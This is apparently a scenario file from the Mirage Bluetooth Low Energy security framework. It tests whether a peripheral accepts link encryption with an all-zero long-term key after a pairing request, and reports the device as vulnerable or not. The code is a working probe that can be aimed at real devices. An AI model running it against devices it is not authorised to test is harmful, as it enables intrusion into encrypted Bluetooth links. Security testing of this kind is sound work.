from mirage.core import scenario
from mirage.libs import io, ble
from mirage.libs.ble_utils.dissectors import *
from mirage.libs.ble_utils.sc_crypto import CryptoUtils


class ble_zero_ltk(scenario.Scenario):
    def onStart(self):
        self.module.printScenarioStart("Zero LTK")

        # Success status of the scenario
        self.finished = False
        self.success = self.module.ScenarioResult.NOT

        # Apply new address at each start
        self.module.a2sEmitter.setAddress(CryptoUtils.getRandomAddress(), random=True)

        # Connect on slave
        io.info("Connect on slave")
        self.module.setStage(self.module.BLEStage.WAIT_CONN)
        self.module.connectOnSlave()
        self.module.waitUntilStage(self.module.BLEStage.IDLE)
        pairingRequest = self.getPairingRequest()
        self.module.setStage(self.module.BLEStage.CUSTOM1)
        self.module.a2sEmitter.sendp(pairingRequest)
        io.info("Send Pairing Request: {}".format(pairingRequest))
        return True

    def getPairingRequest(self):
        keyboard = False
        yesno = False
        display = False

        ct2 = False
        mitm = True
        bonding = True
        secureConnections = True
        keyPress = False

        initiatorInputOutputCapability = ble.InputOutputCapability(
            keyboard=keyboard, display=display, yesno=yesno
        )
        initiatorAuthReq = ble.AuthReqFlag(
            ct2=ct2,
            mitm=mitm,
            bonding=bonding,
            secureConnections=secureConnections,
            keypress=keyPress,
        )
        initiatorKeyDistribution = ble.KeyDistributionFlag(
            linkKey=True, encKey=True, idKey=False, signKey=True
        )

        return ble.BLEPairingRequest(
            authentication=initiatorAuthReq.data[0],
            inputOutputCapability=initiatorInputOutputCapability.data[0],
            initiatorKeyDistribution=initiatorKeyDistribution.data[0],
            responderKeyDistribution=initiatorKeyDistribution.data[0],
        )

    def onEnd(self, result):
        result["success"] = self.success
        result["finished"] = self.finished
        self.module.printScenarioEnd(result)
        return True

    def onKey(self, key):
        if key == "esc":
            self.module.setStage(self.module.BLEStage.STOP)
        return True

    def onSlaveConnectionComplete(self, packet):
        self.module.setStage(self.module.BLEStage.IDLE)
        return True

    def onSlaveDisconnect(self, packet):
        self.module.setStage(self.module.BLEStage.STOP)
        return False

    def onSlavePairingResponse(self, packet):
        auth = ble.AuthReqFlag(data=bytes([packet.authentication]))
        io.info("Received Pairing Response: {}".format(packet))
        ediv = 0
        rand = b"\x00" * 8
        ltk = b"\x00" * 16
        if not auth.secureConnections:
            ediv = 123
            rand = CryptoUtils.generateRandom(8)
        io.info("Start encryption with zero LTK")
        request = ble.BLEStartEncryption(rand=rand, ediv=ediv, ltk=ltk)
        request.show()
        self.module.a2sEmitter.sendp(request)

    def onSlaveLLRejectInd(self, packet):
        if not self.finished:
            io.success("Slave rejected encryption request, not vulnerable")
            self.success = self.module.ScenarioResult.NOT
            self.finished = True
            self.module.setStage(self.module.BLEStage.STOP)

    def onSlaveLLStartEncRsp(self, packet):
        if not self.finished:
            io.fail("Successfully established encrypted link, device is vulnerable")
            self.success = self.module.ScenarioResult.VULN
            self.finished = True
            self.module.setStage(self.module.BLEStage.STOP)

    def onSlaveEncryptionChange(self, packet):
        if not self.finished:
            if packet.status == 0x00 and packet.enabled == 0x01:
                io.fail("Successfully established encrypted link, device is vulnerable")
                self.success = self.module.ScenarioResult.VULN
                self.finished = True
                self.module.setStage(self.module.BLEStage.STOP)
            else:
                io.success("Slave rejected encryption request, not vulnerable")
                self.success = self.module.ScenarioResult.NOT
                self.finished = True
                self.module.setStage(self.module.BLEStage.STOP)

    def onSlavePairingFailed(self, packet):
        if packet.reason == ble.SM_ERR_PAIRING_NOT_SUPPORTED:
            self.success = self.module.ScenarioResult.VULN
            io.fail("Slave does not support pairing")
            self.finished = True
            self.module.setStage(self.module.BLEStage.STOP)
            self.module.a2sEmitter.sendp(ble.BLEDisconnect())
        return False
